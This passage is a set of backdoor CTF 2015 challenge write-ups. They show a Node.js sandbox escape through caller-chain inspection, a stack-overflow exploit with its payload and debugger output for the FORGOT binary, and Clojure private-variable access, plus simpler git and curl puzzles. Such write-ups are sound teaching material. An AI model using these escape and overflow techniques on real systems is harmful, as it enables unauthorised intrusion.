**Points:** 225
**Author:** [Amanpreet Singh](https://backdoor.sdslabs.co/users/apsdehal)
**Difficulty:** TODO
**Solves:** 24
**Description:**

* <https://backdoor.sdslabs.co/challenges/CONCEALED>

> All paths have been concealed. Get the hidden flag: `nc hack.bckdr.in 8005`. Submit sha-256 of the flag

## Write-up

by [mathiasbynens](https://github.com/mathiasbynens)

Let’s connect to the service:

```bash
$ nc hack.bckdr.in 8005
######################################
####           CONCEAL            ####
######################################

Welcome to CONCEAL
You have access to object named sandboxed and its functions
Rest everything is sandboxed, don’t be a jerk and break something
Wrap your code in a function and return what you want as output
Flag is hidden somewhere in the code.
Get the flag :D!

home@jail:$
```

The welcome message reveals that the flag is hidden in the source code running the service. Some initial testing reveals it’s a JavaScript sandbox:

```
home@jail:$ sandboxed
TypeError: Property 'sandboxed' of object #<Object> is not a function

home@jail:$ function() { return sandboxed; }
[object Object]

home@jail:$ function() { return Object.keys(sandboxed); }
readFlag,print

home@jail:$ sandboxed.readFlag
flag: wrong_flag

home@jail:$ function() { return sandboxed.readFlag; }
function () {
  text = 'flag: wrong_flag';
  return text;
}

home@jail:$ sandboxed.print
undefined

undefined

home@jail:$ function() { return sandboxed.print; }
function (data) {
  sys.print(data + '\n' + '\n');
}
```

It’s possible to crash the application, which reveals a small part of the source code, but not the flag:

```
home@jail:$ function() { return this; }

/index.js:76
                sys.print(data + '\n');
                               ^
TypeError: Cannot convert object to primitive value
    at /index.js:76:20
    at /node_modules/prompt/lib/prompt.js:316:32
    at /node_modules/prompt/node_modules/utile/node_modules/async/lib/async.js:142:25
    at assembler (/node_modules/prompt/lib/prompt.js:313:9)
    at /node_modules/prompt/lib/prompt.js:322:32
    at /node_modules/prompt/lib/prompt.js:599:5
    at Interface.onLine (/node_modules/prompt/node_modules/read/lib/read.js:111:5)
    at Interface.emit (events.js:95:17)
    at Interface._onLine (readline.js:203:10)
    at Interface.<anonymous> (readline.js:323:12)
```

In JavaScript function contexts, `arguments.callee` refers to the currently executing function. As a result, `arguments.callee.caller` refers to the function that called the current one (i.e. one level up the call stack). This enables us to find out how the sandbox wraps our input:

```
home@jail:$ function() { return String(arguments.callee.caller); }
function () {return (function() { return String(arguments.callee.caller); })()}
```

So, our input gets wrapped in `function () {return ($INPUT)()}` and executed in a sandbox. But what is the `caller` of that function?

```
home@jail:$ function() { return String(arguments.callee.caller.caller); }
function () {
        if (!(this instanceof Script)) {
          throw new TypeError('invalid call to ' + f);
        }
        return ns[f].apply(ns, arguments);
      }
```

A-ha! We’re slowly revealing more and more source code, but no flag so far.  We need to go deeper!

Eventually we end up with the following payload which reveals the flag as part of a source code comment:

```
home@jail:$ function() { return String(arguments.callee.caller.caller.caller.caller.caller.caller.caller.caller.caller); }
function (err, line) {

    // flag : [redacted]

    if (err && wait === false) {
      return callback(err);
    }

    var against = {},
        numericInput,
        isValid;

    if (line !== '') {
      if (schema.properties[propName]) {
        var type = (schema.properties[propName].type || '').toLowerCase().trim() || undefined;

        //
        // Attempt to parse input as a float if the schema expects a number.
        //
        if (type == 'number') {
          numericInput = parseFloat(line, 10);
          if (!isNaN(numericInput)) {
            line = numericInput;
          }
        }

        //
        // Attempt to parse input as a boolean if the schema expects a boolean
        //
        if (type == 'boolean') {
          if(line === "true") {
            line = true;
          }
          if(line === "false") {
            line = false;
          }
        }

        //
        // If the type is an array, wait for the end. Fixes #54
        //
        if (type == 'array') {
          var length = prop.schema.maxItems;
          if (err) {
            if (err.message == 'canceled') {
              wait = false;
              stdout.write('\n');
            }
          }
          else {
            if (length) {
              if (tmp.length + 1 < length) {
                isValid = false;
                wait = true;
              }
              else {
                isValid = true;
                wait = false;
              }
            }
            else {
              isValid = false;
              wait = true;
            }
            tmp.push(line);
          }
          line = tmp;
        }
      }

      against[propName] = line;
    }

    if (prop && prop.schema.before) {
      line = prop.schema.before(line);
    }

    // Validate
    if (isValid === undefined) isValid = prompt._performValidation(name, prop, against, schema, line, callback);

    if (!isValid) {
      return prompt.getInput(prop, callback);
    }

    //
    // Log the resulting line, append this `property:value`
    // pair to the history for `prompt` and respond to
    // the callback.
    //
    logger.input(line.yellow);
    prompt._remember(propName, line);
    callback(null, line);

    // Make sure `tmp` is emptied
    tmp = [];
  }
```

Now that we have the flag, all that’s left to do is to hash it using SHA-256 so it can be submitted:

```bash
$ printf "$flag" | sha256sum
```

## Other write-ups and resources

* <http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-concealed-writeup/>
* <https://babyphd.net/2015/04/backdoorctf-writeup/>
# backdoor CTF 2015: [FORGOT](https://backdoor.sdslabs.co/challenges/FORGOT)

**Category:** Exploit
**Points:** 200
**Author:** [Abhishek Kandoi](https://backdoor.sdslabs.co/users/abhikandoi2000)
**Difficulty:**
**Solves:** 76
**Description:** 

* <https://backdoor.sdslabs.co/challenges/FORGOT>

> Fawkes has been playing around with Finite State Automaton lately. While exploring the concept of implementing regular expressions using FSA he thought of implementing an email-address validator.
> 
> Recently, Lua started to annoy Fawkes. To this, Fawkes, challenged Lua to a battle of wits. Fawkes promised to reward Lua, only if she manages to transition to a non-reachable state in the FSA he implemented. The replication can be accessed [here](http://hack.bckdr.in/FORGOT/forgot-724a09c084a9df46d8555bf77612e612.tar.gz).
> 
> Service running at hack.bckdr.in:8009

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://ctf-team.vulnhub.com/backdoor-ctf-2015-forgot/>
* <http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-forgot-writeup/>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/BACKDOORCTF/pwnable/forgot>
* <https://github.com/TUCTF/write-ups-2015/tree/master/Backdoorctf15/forgot_200>
* <http://chinmaydd.github.io/2015/06/05/Backdoor-ctf/>

To reproduce the writeup and test it locally, the binary provided needs a file named `flag` in the same directory containing the flag:

```bash
$ echo "FLAG{this_is_usually_secret}" > flag 
$ cat flag
FLAG{this_is_usually_secret}
```

We extract a binary from the gzipped compressed tar archive using `tar xvf forgot-724a09c084a9df46d8555bf77612e612.tar.gz`.

Using `file`, we see that we are dealing with an i386 32 bit stripped ELF:

```bash
$ file forgot
forgot: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=35930a2d9b048236694e9611073b759e1c88b8c4, stripped
```

Using `gdb-peda` or `checksec`, we find out what kind of security is enabled:


```bash
$ checksec --file ./forgot
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   ./forgot

gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

`NX` enabled - so we can't execute shellcode on the stack!

Next, we run the program to get a feeling what it does (PS: always make sure you got a copy of the original binary for possible self-modifications ;)):

```bash
$ ./forgot 
What is your name?
> name

Hi name


                        Finite-State Automaton

I have implemented a robust FSA to validate email addresses
Throw a string at me and I will let you know if it is a valid email address

                                Cheers!

I should give you a pointer perhaps. Here: 8048654

Enter the string to be validate
> string
This all you got? I don't even see an @!
```

Two things that stand out:

* Two user inputs that we control, the `name` and `string`
* A pointer to something - function, string or something else - in the binary `8048654`

Let's try a stack overflow vulnerability by providing 100 `A`s as input:

```bash
Reading symbols from ./forgot...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/vbox/pwn/tasks/backdoor-forgot/public/FORGOT/forgot 
What is your name?
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

                        Finite-State Automaton

I have implemented a robust FSA to validate email addresses
Throw a string at me and I will let you know if it is a valid email address

                                Cheers!

I should give you a pointer perhaps. Here: 8048654

Enter the string to be validate
> 
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x41414141 ('AAAA')
EBX: 0x45 ('E')
ECX: 0x20 (' ')
EDX: 0x5 
ESI: 0x0 
EDI: 0x0 
EBP: 0xffffd558 --> 0x0 
ESP: 0xffffd4cc --> 0x8048a67 (mov    eax,ds:0x804b060)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffd4cc --> 0x8048a67 (mov    eax,ds:0x804b060)
0004| 0xffffd4d0 --> 0xffffd4e0 ('A' <repeats 69 times>)
0008| 0xffffd4d4 --> 0xffffd4e0 ('A' <repeats 69 times>)
0012| 0xffffd4d8 --> 0xf7fb8c20 --> 0xfbad2288 
0016| 0xffffd4dc --> 0x0 
0020| 0xffffd4e0 ('A' <repeats 69 times>)
0024| 0xffffd4e4 ('A' <repeats 65 times>)
0028| 0xffffd4e8 ('A' <repeats 61 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ bt
#0  0x41414141 in ?? ()
#1  0x08048a67 in ?? ()
#2  0xf7e2aa63 in __libc_start_main () from /lib32/libc.so.6
#3  0x08048501 in ?? ()
```

Seems like `name` is vulnerable to stack overflow, meaning that we can control the return address `EIP` of the function that handles our input.

Using `gdb`'s `bt` (backtrack) function, we can see that this function's `EIP` and therefore next instruction would have been at address `0x08048a67`.

Let's have a look which function must have been containing this instruction according to their starting address.

We can do so by pipings `radare2`'s `afl` ([List all functions](https://github.com/pwntester/cheatsheets/blob/master/radare2.md#analyze)) output to `sort` and find the function nearest to our address `08048a67`:

```
$ r2 ./forgot
[0x080484e0]> aa
[0x080484e0]> afl | sort -k1
0x0804843c 10   1  fcn.0804843c
0x08048440 6   1  sym.imp.printf
[...]
0x080487aa 293   1  main
0x080488cf 426   4  fcn.080488cf
0x080488d4 421   5  fcn.08048a40
0x08048a79 104   3  fcn.08048a79
0x08048a80 97   3  fcn.08048a80
[...]
0x08049132 32   1  fcn.08049132
0x08049152 4186  50  fcn.08049152
```

NOTE: You can also pipe the output to `column -t` to get a better formatted result.

While main is at `0x080487aa`, we can see our function must have been `fcn.08048a40` with entry point `0x080488d4`.

NOTE: I don't know the meaning for each column in `afl`'s output. I guess first argument is the entry point of the function with name displayed in column 4. The second seems to be the number of bytes used for this function.

However, in the case of our function called `fcn.08048a40` starts at `0x080488d4`. Please fill out the question marks if you know the answer :).

We decompile `fcn.08048a40`:

```bash
[0x080484e0]> pdf @0x080488d4
/ (fcn) fcn.080488cf 426
| --------> 0x080488cf    837c247809   cmp dword [esp+0x78], 0x9
|- fcn.08048a40 421
|       ,=< 0x080488d4    0f8761010000 ja 0x8048a3b
|       |   0x080488da    8b442478     mov eax, [esp+0x78]
[...]
|       |   0x08048902    85c0         test eax, eax
|      ,==< 0x08048904    740d         jz 0x8048913
|      ||   0x08048906    c7442478020. mov dword [esp+0x78], 0x2
|     ,===< 0x0804890e    e928010000   jmp 0x8048a3b ; (fcn.08048a40)
|    ,=`--> 0x08048913    e923010000   jmp 0x8048a3b ; (fcn.08048a40)
|    || |   0x08048918    8d542410     lea edx, [esp+0x10]
[...]
|    || |   0x08048925    3c40         cmp al, 0x40
|   ,=====< 0x08048927    750d         jnz 0x8048936
|   ||| |   0x08048929    c7442478030. mov dword [esp+0x78], 0x3
|  ,======< 0x08048931    e905010000   jmp 0x8048a3b ; (fcn.08048a40)
| ,=`-----> 0x08048936    e900010000   jmp 0x8048a3b ; (fcn.08048a40)
| || || |   0x0804893b    8d542410     lea edx, [esp+0x10]
[...]
| || || |   0x08048a3a    90           nop
| ``-``-`-> 0x08048a3b    8344247c01   add dword [esp+0x7c], 0x1
|           ; CODE (CALL) XREF from 0x080488ca (unk)
|           0x08048a40    8b5c247c     mov ebx, [esp+0x7c]
|           0x08048a44    8d442410     lea eax, [esp+0x10]
|           0x08048a48    890424       mov [esp], eax
|           0x08048a4b    e850faffff   call 0x1080484a0 ; (sym.imp.strlen)
|              sym.imp.strlen()
|           0x08048a50    39c3         cmp ebx, eax
| ========< 0x08048a52    0f8277feffff jb 0x1080488cf
|           0x08048a58    836c247801   sub dword [esp+0x78], 0x1
|           0x08048a5d    8b442478     mov eax, [esp+0x78]
|           0x08048a61    8b448430     mov eax, [esp+eax*4+0x30]
|           0x08048a65    ffd0         call eax
|              0x00000000()        
|           0x08048a67    a160b00408   mov eax, [sym.stdout]
|           0x08048a6c    890424       mov [esp], eax
|           0x08048a6f    e8dcf9ffff   call 0x108048450 ; (sym.imp.fflush)
|              sym.imp.fflush()
|           0x08048a74    8b5dfc       mov ebx, [ebp-0x4]
|           0x08048a77    c9           leave
\           0x08048a78    c3           ret
```

We called a function stored in `EAX`, which we most likely were able to overwrite (see gdb output from earlier).

Since we can't execute shellcode on the stack, because `NX` is enabled, we have to use something else to get to the flag.

One of these options is to call a function that might be doing something interesting for us, possibly a hidden function.

First, we listing our from `libc.so.6` imported function, we see some interesting functions that are called:

```bash
[0x080485e0]> il
[Linked libraries]
libc.so.6

1 libraries
[0x080485e0]> ii
[Imports]
ordinal=001 plt=0x08048440 bind=GLOBAL type=FUNC name=printf
ordinal=002 plt=0x08048450 bind=GLOBAL type=FUNC name=fflush
ordinal=003 plt=0x08048460 bind=GLOBAL type=FUNC name=fgets
ordinal=004 plt=0x08048470 bind=GLOBAL type=FUNC name=puts
ordinal=005 plt=0x08048480 bind=GLOBAL type=FUNC name=system
ordinal=006 plt=0x08048490 bind=UNKNOWN type=NOTYPE name=__gmon_start__
ordinal=007 plt=0x080484a0 bind=GLOBAL type=FUNC name=strlen
ordinal=008 plt=0x080484b0 bind=GLOBAL type=FUNC name=__libc_start_main
ordinal=009 plt=0x080484c0 bind=GLOBAL type=FUNC name=snprintf
ordinal=010 plt=0x080484d0 bind=GLOBAL type=FUNC name=__isoc99_scanf

10 imports
```

Adding to that, we also print all strings:

```bash
[0x080484e0]> izz
[strings]
addr=0x08048b11 off=0x00000b11 ordinal=000 sz=6 section=.rodata string=His
addr=0x08048b1c off=0x00000b1c ordinal=001 sz=23 section=.rodata string=FiniteStateAutomaton
addr=0x08048b34 off=0x00000b34 ordinal=002 sz=60 section=.rodata string=IhaveimplementedarobustFSAtovalidateemailaddresses
addr=0x08048b70 off=0x00000b70 ordinal=003 sz=76 section=.rodata string=ThrowastringatmeandIwillletyouknowifitisavalidemailaddress
addr=0x08048bc1 off=0x00000bc1 ordinal=004 sz=8 section=.rodata string=Cheers
addr=0x08048bcc off=0x00000bcc ordinal=005 sz=87 section=.rodata string=Dudeyouseriouslythinkthisisgoingtowork.Wherearethefancyanddothuh
addr=0x08048c24 off=0x00000c24 ordinal=006 sz=41 section=.rodata string=ThisallyougotIdontevenseean
addr=0x08048c50 off=0x00000c50 ordinal=007 sz=61 section=.rodata string=AreyouhungryYoujustatetheentirepartthatfollows
addr=0x08048c90 off=0x00000c90 ordinal=008 sz=78 section=.rodata string=Seemslikeyouworkalotonyourlocalhostrealdomainsconsistofa.dot
addr=0x08048ce0 off=0x00000ce0 ordinal=009 sz=45 section=.rodata string=Sentencesendwithadotnotdomainschu
addr=0x08048d10 off=0x00000d10 ordinal=010 sz=89 section=.rodata string=Thatishellofaninterestingdomainneverseenatopleveldomainwithasinglechar.
addr=0x08048d69 off=0x00000d69 ordinal=011 sz=14 section=.rodata string=Validhai
addr=0x08048d78 off=0x00000d78 ordinal=012 sz=39 section=.rodata string=Youjustmadeit.Butthenyoudidnt
addr=0x08048d9f off=0x00000d9f ordinal=013 sz=7 section=.rodata string=.flag
addr=0x08048da6 off=0x00000da6 ordinal=014 sz=7 section=.rodata string=cats
addr=0x08048dad off=0x00000dad ordinal=015 sz=19 section=.rodata string=Whatisyourname
addr=0x08048dc0 off=0x00000dc0 ordinal=016 sz=3 section=.rodata string=
addr=0x08048dc4 off=0x00000dc4 ordinal=017 sz=46 section=.rodata string=Ishouldgiveyouapointerperhaps.Herex
addr=0x08048df4 off=0x00000df4 ordinal=018 sz=32 section=.rodata string=Enterthestringtobevalidate
addr=0x08048e14 off=0x00000e14 ordinal=019 sz=3 section=.rodata string=s

20 strings
[0x080484e0]> psz @0x08048d9f
./flag
[0x080484e0]> psz @0x08048da6
cat %s
[0x080484e0]> s 0x08048b11
[0x08048b11]> pdf
   ;      [14] va=0x08048b08 pa=0x00000b08 sz=824 vsz=824 rwx=-r-- .rodata
/ (fcn) fcn.08048b08 965
|           ;-- section..rodata:
|           0x08048b08    0300         add eax, [eax]
|           0x08048b0a    0000         add [eax], al
|           ;-- sym._IO_stdin_used:
|           0x08048b0c hex length=4 delta=0
 0100 0200                                ....            
|           0x08048b10    0a4869       or cl, [eax+0x69]
|           0x08048b13     .string "Hi %s" ; len=6
|           0x08048b19    0909         or [ecx], ecx
|           0x08048b1b    094669       or [esi+0x69], eax
|           0x08048b1e     .string "Finite-State Automaton" ; len=23
|      ||   0x08048b35     .string "I have implemented a robust FSA to validate email addresses" ; len=60
|  ||||||   ; DATA XREF from 0x20776f72 (unk)
|  ||||||   0x08048b71     .string "Throw a string at me and I will let you know if it is a valid email address" ; len=76
|           0x08048bbd    0909         or [ecx], ecx
|           0x08048bbf    0909         or [ecx], ecx
|           ;-- str.Cheers:
|           0x08048bc1     .string "Cheers!" ; len=8
|           0x08048bc9    0000         add [eax], al
|           0x08048bcb    00447564     add [ebp+esi*2+0x64], al
|           0x08048bcf     .string "Dude, you seriously think this is going to work. Where are the fancy _ and [dot], huh?" ; len=87
|           0x08048c26     .string "This all you got? I don't even see an _!" ; len=41
|           0x08048c4f    004172       add [ecx+0x72], al
|           0x08048c52     .string "Are you hungry? You just ate the entire part that follows _!" ; len=61
|           0x08048c8f    005365       add [ebx+0x65], dl
|           0x08048c92     .string "Seems like you work a lot on your localhost, real domains consist of a .[dot]" ; len=78
|           ;-- str.Sentencesendwithadotnotdomainschu:
|           0x08048ce0     .string "Sentences end with a [dot], not domains chu!" ; len=45
|           0x08048d0d    0000         add [eax], al
|           0x08048d0f    00546861     add [eax+ebp*2+0x61], dl
| ========< 0x08048d13     .string "That is hell of an interesting domain, never seen a top-level domain with a single char." ; len=89
|           0x08048d6c     .string ":) Valid hai!" ; len=14
| ========< 0x08048d7a     .string "You just made it. But then you didn't!" ; len=39
|           0x08048da1     .string "./flag" ; len=7
| ========< 0x08048da8     .string "cat %s" ; len=7
|           0x08048daf     .string "What is your name?" ; len=19
|           0x08048dc2     .string "_ " ; len=3
|           0x08048dc5     .string "I should give you a pointer perhaps. Here: %x" ; len=46
|           0x08048df3    00456e       add [ebp+0x6e], al
| --------> 0x08048df6     .string "Enter the string to be validate" ; len=32
|           0x08048e16     .string "%s" ; len=3
```

So `str..flag` (`./flag`) and `str.cats` (`cat %s`) sound pretty interesting.

Let's search for these strings as well as for the system call in the decompiled assembler code.

To do so, we have to find out how many bytes all functions together inhibit and decompile the whole binary from the first function or symbol `0x0804843c` to the end:

```bash
[0x080484e0]> afl | awk '{s+=$2} END {print s}'
8284
[0x080484e0]> s 0x0804843c
[0x0804843c]> pd 8284 | grep system
Do you want to print 409854 chars? (y/N)
/ (fcn) sym.imp.system 6
|           0x080486fb    e880fdffff   call 0x108048480 ; (sym.imp.system)
|              sym.imp.system()
[0x0804843c]> pd 8284 | grep flag
Do you want to print 409854 chars? (y/N)
|           0x080486d2    c744240c9f8. mov dword [esp+0xc], str..flag
|           0x08048da1     .string "./flag" ; len=7
[0x0804843c]> pd 8284 | grep cat
Do you want to print 409854 chars? (y/N)
|           0x080486da    c7442408a68. mov dword [esp+0x8], str.cats
|       ,=< 0x08048da8     .string "cat %s" ; len=7
```

Adding all together, we can see that some function calls `system` at address `0x080486fb` and both strings seem to be close to each other as well as to the system call.

Looking for the nearest function again that inhibits these addresses, we see that the function `fcn.080486cc` with entry address `0x080486cc` seems to be our function.

Decompiling it:

```bash
[0x080484e0]> pdf @0x080486cc
/ (fcn) fcn.080486cc 54
|           0x080486cc    55           push ebp
|           0x080486cd    89e5         mov ebp, esp
|           0x080486cf    83ec58       sub esp, 0x58
|           0x080486d2    c744240c9f8. mov dword [esp+0xc], str..flag
|           0x080486da    c7442408a68. mov dword [esp+0x8], str.cats
|           0x080486e2    c7442404320. mov dword [esp+0x4], 0x32
|           0x080486ea    8d45c6       lea eax, [ebp-0x3a]
|           0x080486ed    890424       mov [esp], eax
|           0x080486f0    e8cbfdffff   call 0x1080484c0 ; (sym.imp.snprintf)
|              sym.imp.snprintf(unk)
|           0x080486f5    8d45c6       lea eax, [ebp-0x3a]
|           0x080486f8    890424       mov [esp], eax
|           0x080486fb    e880fdffff   call 0x108048480 ; (sym.imp.system)
|              sym.imp.system()
|           0x08048700    c9           leave
\           0x08048701    c3           ret
```

This roughly translates to following C-code:

```c
snprintf(somebuffer, 0x32, "cat %s", "./flag");
// somebuffer = "cat ./flag"
system(somebuffer);
```

So this function calls `cat ./flag` - Great!

We just have to provide this function to `EIP` and we should see our flag!

After some fiddling around, we find that `EIP`'s offset is from `0x64` to `0x67`:

```bash
$ python -c 'print "A"*63+"BBBB"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
gdb-peda$ r
Starting program: /home/vbox/pwn/tasks/backdoor-forgot/public/FORGOT/forgot 
What is your name?
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

                        Finite-State Automaton

I have implemented a robust FSA to validate email addresses
Throw a string at me and I will let you know if it is a valid email address

                                Cheers!

I should give you a pointer perhaps. Here: 8048654

Enter the string to be validate
> 
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x42424242 ('BBBB')
EBX: 0x24 ('$')
ECX: 0x20 (' ')
EDX: 0x4 
ESI: 0x0 
EDI: 0x0 
EBP: 0xffffd558 --> 0x0 
ESP: 0xffffd4cc --> 0x8048a67 (mov    eax,ds:0x804b060)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd4cc --> 0x8048a67 (mov    eax,ds:0x804b060)
0004| 0xffffd4d0 --> 0xffffd4e0 ('A' <repeats 32 times>, "BBBB")
0008| 0xffffd4d4 --> 0xffffd4e0 ('A' <repeats 32 times>, "BBBB")
0012| 0xffffd4d8 --> 0xf7fb8c20 --> 0xfbad2288 
0016| 0xffffd4dc --> 0x0 
0020| 0xffffd4e0 ('A' <repeats 32 times>, "BBBB")
0024| 0xffffd4e4 ('A' <repeats 28 times>, "BBBB")
0028| 0xffffd4e8 ('A' <repeats 24 times>, "BBBB")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

We provide the address and feed the input inside `gdb` to `forgot`:

```bash
$ python -c 'print "A"*63+"\xcc\x86\x04\x08"' > in 
gdb-peda$ r < in
Starting program: /home/vbox/pwn/tasks/backdoor-forgot/public/FORGOT/forgot < in
What is your name?
> 
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

                        Finite-State Automaton

I have implemented a robust FSA to validate email addresses
Throw a string at me and I will let you know if it is a valid email address

                                Cheers!

I should give you a pointer perhaps. Here: 8048654

Enter the string to be validate
> [New process 2519]
process 2519 is executing new program: /bin/dash
[New process 2520]
process 2520 is executing new program: /bin/cat
FLAG{this_is_usually_secret}
[Inferior 3 (process 2520) exited normally]
```

We got the flag!

## Other write-ups and resources

* <http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-forgot-writeup/>
* <https://ctf-team.vulnhub.com/backdoor-ctf-2015-forgot/>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/BACKDOORCTF/pwnable/forgot>
* <https://gist.github.com/Bono-iPad/e908ddc67b3994069950>
* <https://github.com/TUCTF/write-ups-2015/tree/master/Backdoorctf15/forgot_200>
* <http://chinmaydd.github.io/2015/06/05/Backdoor-ctf/>
* [Indonesian](https://docs.google.com/document/d/1wUxXhTVrmbYXv7eza85T6DgHP5i7h7ItuD_JTDjekJk/edit)
# backdoor CTF 2015: [NONAME](https://backdoor.sdslabs.co/challenges/NONAME)

**Category:** Exploit
**Points:** 200
**Author:** [Amanpreet Singh](https://backdoor.sdslabs.co/users/apsdehal)
**Difficulty:**
**Solves:** 25
**Description:** 

* <https://backdoor.sdslabs.co/challenges/NONAME>

> Intrestingly enough, even though it was not expected, Chintu found a cool website to play with, though he can't get the flag. Can you? Visit [this](https://agile-garden-1672.herokuapp.com/). Submit the SHA-256 hash of the flag obtained.

## Write-up

by [polym](https://github.com/abpolym)

We are given a Clojure sandbox and have to find the flag and secret of an user named admin.

Entering valid clojure code, we can execute several functions, e.g. printing the version:

```clojure
Give me some code:
> (clojure-version)
"1.4.0"
```

After learning about clojure, we first print the complete [namespace](http://clojure.org/namespaces) to find any suspicious imported functions or namespaces using the [all-ns](http://clojure.github.io/clojure/clojure.core-api.html#clojure.core/all-ns) function:

```clojure
> (all-ns)
[..see all-ns file..]
```

We see a namespace named `noname.people.admin`, so we try to find any variables within this namespace after importing this namespace:

```clojure
> (require '[noname.people.admin :as adm])
nil
> (adm/flag)
Ma flag is : [REDACTED]
> (adm/secret)
java.lang.IllegalStateException: var: #'noname.people.admin/secret is not public
```

Mhh, we can access the variable flag, but can't access secret. Secret must be private. Fortunately, there is a way to read private variables described [here](http://christophermaier.name/blog/2011/04/30/not-so-private-clojure-functions):

```clojure
> (#'adm/secret)
"Ma secret is: [REDACTED]"
```

We concat these two strings and make a sha256 hash out of them and get the flag!

## Other write-ups and resources

* <http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-noname-writeup/>
* <https://babyphd.net/2015/04/backdoorctf-writeup/>
* [Indonesian](https://docs.google.com/document/d/1O6TLRT0Vvyd5YT_GBlHvrCuhuGM_E_CJXXitNsdNbaw/edit)
* [Indonesian](https://khoadungit.wordpress.com/2015/04/14/backdoor-ctf-2015-noname-writeup/)
# backdoor CTF 2015: [TIM](https://backdoor.sdslabs.co/challenges/TIM)

**Category:** Forensics
**Points:** 100
**Author:** [Abhay Bir Singh Rana](https://backdoor.sdslabs.co/users/nemo)
**Difficulty:** Easy
**Solves:** 116
**Description:** 

* <https://backdoor.sdslabs.co/challenges/TIM>

> Visit <https://github.com/backdoor-ctf/TIM> to get the flag.

## Write-up

by [polym](https://github.com/abpolym)

We see in the github repo that there are [several commits](https://github.com/backdoor-ctf/TIM/commits/master), each having an ASCII character commit message of length 2 up until the last commit, which just says `Adds flag`.

After joining the commit messages to one, beginning at the oldest commit, we see a hint:

```bash
echo 4a6f696e2066697273742074776f2063686172616374657273206f66206561636820636f6d6d6974207368613120464c4147 | xxd -r -p
Join first two characters of each commit sha1 FLAG
```

We do exactly what the hint tells us to do and receive the flag:

```bash
$ git rev-list --all | grep -v '^00' | tail -r -n+33 | while read c; do echo -n ${c::2}; done
75[...]
```

Note that there is a padding to confuse people, which is indicated by commits beginning with `00`:

```bash
$ git rev-list --all 
d444f3227636477902c4badc8e35a27cadab456c
009d01e1b04bf2bf2d9bebd666e8d167fae1dc1a
006d89cdd1a4ea3620bc6d4f865a2e341f5ee79a
[...]
00d3be57b5291c68585e8eaadc8c159bbfe7d8e9
05928975ce6acd49c30a5314fa4019d73046ec84
676c0278c6602ca337e0666347eed1c62b1e5e27
[...]
75ae4979ffbb663dbc665495cf892e108114adcd
0068a486c186d9e38e51f87720a0dd65c3e8384d
[...]
0075376f5b95ab02608746da37cd7bfa54ccbc89
```

The flag is not printed here, since this is a long lived CTF.

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/backdoor-ctf-2015-tim/>
* <http://linux.im/2015/04/03/backdoor-ctf-2015-writeup.html#tim--forensics100>
* [Indonesian](https://docs.google.com/document/d/1aAllg6gpMRFi0SMJv18rXbJLSI-yzro3UGABim1eNo4/edit)
# backdoor CTF 2015: [LHC](https://backdoor.sdslabs.co/challenges/LHC)

**Category:** Misc
**Points:** 100
**Author:** [Abhay Bir Singh Rana](https://backdoor.sdslabs.co/users/nemo)
**Difficulty:** Medium
**Solves:** 81
**Description:** 

* <https://backdoor.sdslabs.co/challenges/LHC>

> The flag is in the middle of [this dataset](https://lhc-cdn.herokuapp.com/data.txt) kindly provided to us by the Large Hadron Collider.

## Write-up

by [polym](https://github.com/abpolym)

We are told to download a big file (2.0T according to `wget https://lhc-cdn.herokuapp.com/data.txt`) and that we receive the flag in the middle of the big file.

The solution is not to download the whole file but to begin at a specific offset using e.g. the ranges option of `curl`:

To get the correct `Content-Range` and `Content-Length` tags, we download the last byte of the file:

```bash
curl -I https://lhc-cdn.herokuapp.com/data.txt -r -1 > headers.html
```

[headers.html](headers.html)

We see some weird tags that make us suggest that we have to begin at the index `2200000000000/2-32 = 1099999999968` and end at index `1099999999968 + len(sha256flag) = 1099999999968 + 64 = 1100000000032`

We can specify the ranges using the `-r` flag of `curl`:

```bash
$ curl -r 1099999999968-1100000000032 https://lhc-cdn.herokuapp.com/data.txt
 flag is: bf[...]
```

After some fiddling, we see that the actual ranges are `1099999999952-1100000000049`:

```bash
$ curl -r 1099999999952-1100000000049 https://lhc-cdn.herokuapp.com/data.txt
            The flag is: bf[...]
```

The flag won't be printed here, since this CTF is a long lived one.

## Other write-ups and resources

